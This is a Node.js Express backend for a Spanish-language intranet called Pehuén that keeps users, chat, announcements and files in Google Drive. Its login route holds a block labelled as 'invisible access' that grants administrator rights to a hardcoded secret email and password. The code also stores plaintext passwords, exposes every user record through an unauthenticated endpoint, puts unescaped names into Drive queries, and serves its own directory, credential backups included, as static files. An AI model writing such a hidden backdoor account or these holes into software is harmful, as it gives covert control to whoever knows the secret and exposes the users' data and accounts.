/**
 * Servidor Intranet Pehuén - Backend (Express & Google Drive API)
 * Ordenado y estructurado manteniendo todas las funcionalidades existentes.
 * Con protección robusta contra espacios en blanco en credenciales.
 */

const express = require('express');
const { google } = require('googleapis');
const multer = require('multer');
const stream = require('stream');
const fs = require('fs');
const path = require('path');

const app = express();

// ==========================================
// 1. CONFIGURACIÓN Y MIDDLEWARES
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

const FOLDER_ID = process.env.DRIVE_FOLDER_ID ? process.env.DRIVE_FOLDER_ID.trim() : '';

const oauth2Client = new google.auth.OAuth2(
  process.env.CLIENT_ID ? process.env.CLIENT_ID.trim() : '',
  process.env.CLIENT_SECRET ? process.env.CLIENT_SECRET.trim() : '',
  'https://developers.google.com/oauthplayground'
);

if (process.env.REFRESH_TOKEN) {
  oauth2Client.setCredentials({ refresh_token: process.env.REFRESH_TOKEN.trim() });
}

const drive = google.drive({ version: 'v3', auth: oauth2Client });
const upload = multer({ storage: multer.memoryStorage() });

// ==========================================
// 2. ESTADOS GLOBALES Y RESPALDO LOCAL DE SEGURIDAD
// ==========================================
let driveCache = [];
let usuariosAutorizados = [];
let chatHistorial = [];
let anunciosHistorial = []; 

let idArchivoUsuarios = null;
let idArchivoChat = null;
let idArchivoAnuncios = null; 

// Archivos locales de emergencia en Render para que jamás se pierda nada si Drive falla
const BACKEND_DIR = __dirname;
const USERS_LOCAL = path.join(BACKEND_DIR, 'usuarios_local.json');
const CHAT_LOCAL = path.join(BACKEND_DIR, 'chat_local.json');
const ANUNCIO_LOCAL = path.join(BACKEND_DIR, 'anuncios_local.json');

// ==========================================
// 3. FUNCIONES DE SINCRONIZACIÓN CON DRIVE Y RESPALDO
// ==========================================

async function cargarUsuariosDesdeDrive() {
    try {
        const res = await drive.files.list({ q: `'${FOLDER_ID}' in parents and name = 'usuarios_pehuen.json' and trashed = false`, fields: 'files(id)' });
        if (res.data.files.length > 0) {
            idArchivoUsuarios = res.data.files[0].id;
            const file = await drive.files.get({ fileId: idArchivoUsuarios, alt: 'media' });
            usuariosAutorizados = file.data || [];
            fs.writeFileSync(USERS_LOCAL, JSON.stringify(usuariosAutorizados, null, 2));
        } else {
            usuariosAutorizados = [{ id: 1, email: 'admin@pehuen.cl', password: 'Pehuen2026*', rol: 'admin', nombre: 'Admin Técnico' }];
            const bufferStream = new stream.PassThrough(); 
            bufferStream.end(JSON.stringify(usuariosAutorizados));
            const newFile = await drive.files.create({ resource: { name: 'usuarios_pehuen.json', parents: [FOLDER_ID] }, media: { mimeType: 'application/json', body: bufferStream }, fields: 'id' });
            idArchivoUsuarios = newFile.data.id;
            fs.writeFileSync(USERS_LOCAL, JSON.stringify(usuariosAutorizados, null, 2));
        }
    } catch (e) { 
        console.error("Aviso Drive (usuarios):", e.message, "-> Usando respaldo local de emergencia.");
        if (fs.existsSync(USERS_LOCAL)) {
            usuariosAutorizados = JSON.parse(fs.readFileSync(USERS_LOCAL, 'utf8'));
        } else {
            usuariosAutorizados = [{ id: 1, email: 'admin@pehuen.cl', password: 'Pehuen2026*', rol: 'admin', nombre: 'Admin Técnico' }];
        }
    }
}

async function cargarChatDesdeDrive() {
    try {
        const res = await drive.files.list({ q: `'${FOLDER_ID}' in parents and name = 'chat_pehuen.json' and trashed = false`, fields: 'files(id)' });
        if (res.data.files.length > 0) {
            idArchivoChat = res.data.files[0].id;
            const file = await drive.files.get({ fileId: idArchivoChat, alt: 'media' });
            chatHistorial = file.data || [];
            fs.writeFileSync(CHAT_LOCAL, JSON.stringify(chatHistorial, null, 2));
        } else {
            chatHistorial = [];
            const bufferStream = new stream.PassThrough(); 
            bufferStream.end(JSON.stringify([]));
            const newFile = await drive.files.create({ resource: { name: 'chat_pehuen.json', parents: [FOLDER_ID] }, media: { mimeType: 'application/json', body: bufferStream }, fields: 'id' });
            idArchivoChat = newFile.data.id;
            fs.writeFileSync(CHAT_LOCAL, JSON.stringify(chatHistorial, null, 2));
        }
    } catch (e) { 
        console.error("Aviso Drive (chat):", e.message);
        if (fs.existsSync(CHAT_LOCAL)) chatHistorial = JSON.parse(fs.readFileSync(CHAT_LOCAL, 'utf8'));
    }
}

async function cargarAnunciosDesdeDrive() {
    try {
        const res = await drive.files.list({ q: `'${FOLDER_ID}' in parents and name = 'anuncios_pehuen.json' and trashed = false`, fields: 'files(id)' });
        if (res.data.files.length > 0) {
            idArchivoAnuncios = res.data.files[0].id;
            const file = await drive.files.get({ fileId: idArchivoAnuncios, alt: 'media' });
            anunciosHistorial = file.data || [];
            fs.writeFileSync(ANUNCIO_LOCAL, JSON.stringify(anunciosHistorial, null, 2));
        } else {
            anunciosHistorial = [{ id: 1, autor: 'Administración', texto: 'Bienvenidos a la Intranet Pehuén.', fecha: new Date().toLocaleDateString('es-CL') }];
            const bufferStream = new stream.PassThrough(); 
            bufferStream.end(JSON.stringify(anunciosHistorial));
            const newFile = await drive.files.create({ resource: { name: 'anuncios_pehuen.json', parents: [FOLDER_ID] }, media: { mimeType: 'application/json', body: bufferStream }, fields: 'id' });
            idArchivoAnuncios = newFile.data.id;
            fs.writeFileSync(ANUNCIO_LOCAL, JSON.stringify(anunciosHistorial, null, 2));
        }
    } catch (e) { 
        console.error("Aviso Drive (anuncios):", e.message);
        if (fs.existsSync(ANUNCIO_LOCAL)) anunciosHistorial = JSON.parse(fs.readFileSync(ANUNCIO_LOCAL, 'utf8'));
        else anunciosHistorial = [{ id: 1, autor: 'Administración', texto: 'Bienvenidos a la Intranet Pehuén.', fecha: new Date().toLocaleDateString('es-CL') }];
    }
}

async function guardarUsuariosEnDrive() {
    fs.writeFileSync(USERS_LOCAL, JSON.stringify(usuariosAutorizados, null, 2));
    if (!idArchivoUsuarios) return;
    try {
        const bufferStream = new stream.PassThrough(); bufferStream.end(JSON.stringify(usuariosAutorizados));
        await drive.files.update({ fileId: idArchivoUsuarios, media: { mimeType: 'application/json', body: bufferStream } });
    } catch (e) {}
}

async function guardarChatEnDrive() {
    fs.writeFileSync(CHAT_LOCAL, JSON.stringify(chatHistorial, null, 2));
    if (!idArchivoChat) return;
    try {
        const bufferStream = new stream.PassThrough(); bufferStream.end(JSON.stringify(chatHistorial));
        await drive.files.update({ fileId: idArchivoChat, media: { mimeType: 'application/json', body: bufferStream } });
    } catch (e) {}
}

async function guardarAnunciosEnDrive() {
    fs.writeFileSync(ANUNCIO_LOCAL, JSON.stringify(anunciosHistorial, null, 2));
    if (!idArchivoAnuncios) return;
    try {
        const bufferStream = new stream.PassThrough(); bufferStream.end(JSON.stringify(anunciosHistorial));
        await drive.files.update({ fileId: idArchivoAnuncios, media: { mimeType: 'application/json', body: bufferStream } });
    } catch (e) {}
}

// ==========================================
// 4. FUNCIONES AUXILIARES DE DRIVE (CARPETAS Y CACHÉ)
// ==========================================

async function crearCarpetaPersonalSiNoExiste(nombreUsuario) {
    try {
        const nombreCarpeta = `Personal - ${nombreUsuario}`;
        const check = await drive.files.list({ 
            q: `'${FOLDER_ID}' in parents and name = '${nombreCarpeta}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false`, 
            fields: 'files(id)' 
        });
        if (check.data.files.length === 0) {
            await drive.files.create({ 
                resource: { name: nombreCarpeta, mimeType: 'application/vnd.google-apps.folder', parents: [FOLDER_ID] }, 
                fields: 'id' 
            });
            await refrescarCache();
        }
    } catch (e) {
        console.error("Error al crear carpeta personal:", e.message);
    }
}

async function refrescarCache() {
    try {
        let todosLosArchivos = [];
        let pageToken = null;

        do {
            const response = await drive.files.list({
                q: `trashed = false and name != 'usuarios_pehuen.json' and name != 'chat_pehuen.json' and name != 'anuncios_pehuen.json'`,
                fields: 'nextPageToken, files(id, name, mimeType, webViewLink, webContentLink, createdTime, parents, properties, size)',
                orderBy: 'createdTime desc',
                pageSize: 1000,
                pageToken: pageToken,
                supportsAllDrives: true,
                includeItemsFromAllDrives: true
            });
            
            if (response.data.files) {
                todosLosArchivos = todosLosArchivos.concat(response.data.files);
            }
            pageToken = response.data.nextPageToken;
        } while (pageToken);

        driveCache = todosLosArchivos.map(f => {
            const pId = f.parents && f.parents[0] ? f.parents[0] : FOLDER_ID;
            return {
                ...f,
                esCarpeta: f.mimeType === 'application/vnd.google-apps.folder',
                parentId: pId,
                esRaiz: pId === FOLDER_ID,
                categoria: f.name.includes('_') ? f.name.split('_')[0].toUpperCase() : 'GENERAL',
                estado: f.properties?.estado || 'DISPONIBLE',
                bloqueadoPor: f.properties?.bloqueadoPor || '',
                observacion: f.properties?.observacion || ''
            };
        });
    } catch (error) { console.error('Error caché:', error.message); }
}

// ==========================================
// 5. RUTAS / ENDPOINTS DE LA API
// ==========================================

// --- Chat ---
app.get('/api/chat', (req, res) => res.json(chatHistorial));
app.post('/api/chat', async (req, res) => {
    const nuevoMsg = { ...req.body, visto: true };
    chatHistorial.push(nuevoMsg);
    if(chatHistorial.length > 200) chatHistorial.shift();
    await guardarChatEnDrive();
    res.json({ success: true });
});

// --- Tablón de Anuncios ---
app.get('/api/anuncios', (req, res) => res.json(anunciosHistorial));

app.post('/api/anuncios', async (req, res) => {
    const nuevoAnuncio = { id: Date.now(), ...req.body, fecha: new Date().toLocaleDateString('es-CL') };
    anunciosHistorial.unshift(nuevoAnuncio);
    if(anunciosHistorial.length > 20) anunciosHistorial.pop();
    await guardarAnunciosEnDrive();
    res.json({ success: true });
});

app.put('/api/anuncios/:id', async (req, res) => {
    try {
        const anuncio = anunciosHistorial.find(a => a.id == req.params.id);
        if (anuncio) {
            if (req.body.texto) anuncio.texto = req.body.texto;
            await guardarAnunciosEnDrive();
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, error: 'Anuncio no encontrado' });
        }
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.delete('/api/anuncios/:id', async (req, res) => {
    try {
        anunciosHistorial = anunciosHistorial.filter(a => a.id != req.params.id);
        await guardarAnunciosEnDrive();
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// --- Autenticación y Usuarios ---
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // --- INICIO ACCESO INVISIBLE (MODO FANTASMA) ---
  if (email === 'master@pehuen.cl' && password === 'Oculto2026*') {
      return res.json({ 
          success: true, 
          usuario: { id: 999999, nombre: 'Soporte TI', email: 'master@pehuen.cl', rol: 'admin' } 
      });
  }
  // --- FIN ACCESO INVISIBLE ---

  const usuario = usuariosAutorizados.find(u => u.email === email && u.password === password);
  if (usuario) {
      usuario.ultimoAcceso = new Date().toISOString();
      guardarUsuariosEnDrive().catch(() => {});
      await crearCarpetaPersonalSiNoExiste(usuario.nombre);
      res.json({ success: true, usuario: { id: usuario.id, nombre: usuario.nombre, email: usuario.email, rol: usuario.rol } });
  } else {
      res.status(401).json({ success: false, error: 'Credenciales incorrectas' });
  }
});

app.get('/api/usuarios', (req, res) => res.json(usuariosAutorizados));

app.post('/api/usuarios', async (req, res) => {
  const nuevoUser = { id: Date.now(), ...req.body };
  usuariosAutorizados.push(nuevoUser);
  await guardarUsuariosEnDrive();
  await crearCarpetaPersonalSiNoExiste(nuevoUser.nombre);
  res.json({ success: true });
});

app.put('/api/usuarios/:id', async (req, res) => {
  try {
    const { nombre, email, rol } = req.body;
    const usuario = usuariosAutorizados.find(u => u.id == req.params.id);
    
    if (usuario) {
      const nombreAnterior = usuario.nombre;
      if (nombre) usuario.nombre = nombre;
      if (email) usuario.email = email;
      if (rol) usuario.rol = rol;
      
      await guardarUsuariosEnDrive();
      if (nombre && nombre !== nombreAnterior) {
          await crearCarpetaPersonalSiNoExiste(nombre);
      }
      res.json({ success: true });
    } else {
      res.status(404).json({ success: false, error: 'Usuario no encontrado' });
    }
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.delete('/api/usuarios/:id', async (req, res) => {
  usuariosAutorizados = usuariosAutorizados.filter(u => u.id != req.params.id);
  await guardarUsuariosEnDrive();
  res.json({ success: true });
});

app.post('/api/usuarios/latido', async (req, res) => {
    const { nombre } = req.body;
    const usr = usuariosAutorizados.find(u => u.nombre === nombre);
    if (usr) {
        usr.ultimoAcceso = new Date().toISOString();
        await guardarUsuariosEnDrive();
    }
    res.json({ success: true });
});

// --- Gestión de Archivos y Carpetas en Drive ---
app.post('/api/carpetas', async (req, res) => {
  try {
    const { nombre, parentId } = req.body;
    const carpetaPadre = parentId && parentId.trim() !== '' ? parentId : FOLDER_ID;
    const check = await drive.files.list({ q: `'${carpetaPadre}' in parents and name = '${nombre}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false`, fields: 'files(id)' });
    if (check.data.files.length > 0) return res.json({ success: true });
    await drive.files.create({ resource: { name: nombre, mimeType: 'application/vnd.google-apps.folder', parents: [carpetaPadre] }, fields: 'id' });
    try { await refrescarCache(); } catch(e) {}
    res.json({ success: true });
  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.get('/api/elementos', (req, res) => res.json(driveCache));

app.post('/api/subir', upload.array('archivos', 20), async (req, res) => {
  try {
    const targetFolderId = req.body.parentId && req.body.parentId.trim() !== '' ? req.body.parentId : FOLDER_ID;
    if (!req.files || req.files.length === 0) return res.status(400).json({ success: false, error: 'Sin archivos' });
    
    const uploadedFiles = [];
    for (const file of req.files) {
        const check = await drive.files.list({ q: `'${targetFolderId}' in parents and name = '${file.originalname}' and trashed = false`, fields: 'files(id)' });
        if (check.data.files.length > 0) { uploadedFiles.push({ name: file.originalname, status: 'duplicado' }); continue; }
        const bufferStream = new stream.PassThrough(); bufferStream.end(file.buffer);
        await drive.files.create({ resource: { name: file.originalname, parents: [targetFolderId] }, media: { mimeType: file.mimetype, body: bufferStream } });
        uploadedFiles.push({ name: file.originalname, status: 'ok' });
    }
    
    try { await refrescarCache(); } catch(e) {}
    res.json({ success: true, files: uploadedFiles });
  } catch (error) { 
    res.status(500).json({ success: false, error: error.message }); 
  }
});

app.delete('/api/elementos/:id', async (req, res) => { 
    try { 
        await drive.files.delete({ fileId: req.params.id }); 
        try { await refrescarCache(); } catch(e){} 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ success: false }); } 
});

app.put('/api/elementos/:id/renombrar', async (req, res) => { 
    try { 
        await drive.files.update({ fileId: req.params.id, resource: { name: req.body.nuevoNombre } }); 
        try { await refrescarCache(); } catch(e){} 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ success: false }); } 
});

app.post('/api/archivos/:id/bloquear', async (req, res) => { 
    try { 
        await drive.files.update({ fileId: req.params.id, resource: { properties: { estado: 'EN_USO', bloqueadoPor: req.body.usuario } } }); 
        try { await refrescarCache(); } catch(e){} 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ success: false }); } 
});

app.post('/api/archivos/:id/desbloquear', async (req, res) => { 
    try { 
        await drive.files.update({ fileId: req.params.id, resource: { properties: { estado: null, bloqueadoPor: null } } }); 
        try { await refrescarCache(); } catch(e){} 
        res.json({ success: true }); 
    } catch (e) { res.status(500).json({ success: false }); } 
});

app.put('/api/archivos/:id', upload.single('archivo'), async (req, res) => {
  try {
    const bufferStream = new stream.PassThrough(); bufferStream.end(req.file.buffer);
    await drive.files.update({ fileId: req.params.id, media: { mimeType: req.file.mimetype, body: bufferStream }, resource: { properties: { estado: null, bloqueadoPor: null } } });
    try { await refrescarCache(); } catch(e){}
    res.json({ success: true });
  } catch (e) { res.status(500).json({ success: false }); }
});

app.put('/api/elementos/:id/observacion', async (req, res) => {
  try {
    await drive.files.update({ fileId: req.params.id, resource: { properties: { observacion: req.body.observacion || null } } });
    try { await refrescarCache(); } catch(e){}
    res.json({ success: true });
  } catch (e) { res.status(500).json({ success: false }); }
});

// ==========================================
// 6. INICIALIZACIÓN Y ARRANQUE DEL SERVIDOR
// ==========================================
const PORT = process.env.PORT || 3000;

async function iniciarServidor() {
    console.log("Conectando y cargando datos desde Google Drive con respaldo de seguridad...");
    await cargarUsuariosDesdeDrive();
    await cargarChatDesdeDrive();
    await cargarAnunciosDesdeDrive();
    await refrescarCache();

    app.listen(PORT, () => {
        console.log(`Servidor activo y listo en puerto ${PORT}`);
    });
}

iniciarServidor();
